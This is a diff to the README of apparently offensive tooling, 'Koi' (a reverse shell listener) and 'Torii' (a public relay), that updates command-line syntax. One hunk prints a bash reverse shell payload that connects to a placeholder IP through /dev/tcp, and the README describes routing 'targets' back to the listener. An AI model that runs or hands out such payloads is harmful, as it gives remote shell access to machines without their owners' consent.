@@ -95,7 +95,7 @@ Koi stays on localhost. Targets connect through Torii. No configuration changes 
 python3 torii_standalone.py --listen 0.0.0.0:49410 --koi 127.0.0.1:4010 --public-host YOUR_PUBLIC_IP
 
 # On the same machine, in another terminal (or just koi if you use the default settings)
-koi --listen 127.0.0.1:4010
+koi --host 127.0.0.1 --port 4010
 ```
 
 That's it. Targets connect to `YOUR_PUBLIC_IP:49410`, everything routes internally to Koi.
@@ -126,7 +126,7 @@ Replace `YOUR_PUBLIC_IP` with the actual IP your targets can reach.
 ### 3. Run Koi on the same machine
 
 ```bash
-koi --listen 127.0.0.1:4010
+koi --host 127.0.0.1 --port 4010
 ```
 
 It stays on localhost. Torii relays everything from the outside.
@@ -138,8 +138,7 @@ Koi doesn't generate Torii payloads automatically. You create them yourself by p
 First, get a regular bash payload from Koi:
 
 ```bash
-$ koi payload
-[?] Interface: eth0
+$ koi --payloads eth0
 bash -i >& /dev/tcp/YOUR_IP/4010 0>&1
 ```
 
